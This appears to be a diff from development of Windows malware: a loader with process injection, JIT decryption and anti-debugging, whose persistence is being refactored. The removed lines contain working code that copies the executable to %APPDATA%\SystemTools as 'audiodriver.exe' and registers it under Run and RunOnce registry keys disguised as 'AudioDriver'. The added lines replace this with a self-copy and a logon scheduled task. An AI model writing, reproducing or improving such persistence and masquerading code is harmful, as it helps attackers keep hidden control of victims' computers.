@@ -5,6 +5,8 @@
 #include "syscalls.h"
 #include "jitdecrypt.h"
 #include "apis.h"
+#include "persistence.h"
+#include <string>
 
 // Add required libraries for linking
 #pragma comment(lib, "shell32.lib")
@@ -35,34 +37,6 @@ PVOID remoteBuf;
 HANDLE processHandle;
 STARTUPINFO info = { 0 };
 PROCESS_INFORMATION processInfo = { 0 };
-
-BOOL InstallRunPersistence(LPCWSTR valueName, LPCWSTR exePath) {
-    HKEY hKey;
-    LONG openRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-    if (openRes != ERROR_SUCCESS) {
-        return FALSE;
-    }
-    LONG setRes = RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
-    RegCloseKey(hKey);
-    return setRes == ERROR_SUCCESS;
-}
-
-BOOL InstallRunOncePersistence(LPCWSTR exePath) {
-    HKEY hKey;
-    LONG openRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_WRITE, &hKey);
-    if (openRes != ERROR_SUCCESS) {
-        return FALSE;
-    }
-
-    GUID guid;
-    CoCreateGuid(&guid);
-    OLECHAR guidStr[39];
-    StringFromGUID2(guid, guidStr, 39);
-
-    LONG setRes = RegSetValueExW(hKey, guidStr, 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
-    RegCloseKey(hKey);
-    return setRes == ERROR_SUCCESS;
-}
 
 int remInj() {
     DWORD pid = findPID();
@@ -139,30 +113,10 @@ int antidbg() {
 }
 
 int main(int argc, char* argv[]) {
-    // Get the full path of the current executable
-    wchar_t currentPath[MAX_PATH];
-    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
-
-    // Construct the destination path in %APPDATA%\SystemTools
-    wchar_t appDataPath[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
-        wchar_t destDir[MAX_PATH];
-        swprintf_s(destDir, MAX_PATH, L"%s\\SystemTools", appDataPath);
-
-        // Create the directory if it doesn't exist
-        CreateDirectoryW(destDir, NULL);
-
-        wchar_t destPath[MAX_PATH];
-        swprintf_s(destPath, MAX_PATH, L"%s\\audiodriver.exe", destDir);
-
-        // Copy the file
-        if (CopyFileW(currentPath, destPath, FALSE)) {
-            // Install persistence
-            InstallRunPersistence(L"AudioDriver", destPath);
-            InstallRunOncePersistence(destPath);
-        }
+    std::wstring destPath;
+    if (CopySelfToAppData(destPath)) {
+        RegisterLogonTask(destPath);
     }
-
 
     if (antidbg() == 44) {
         printf("Running xD\n");
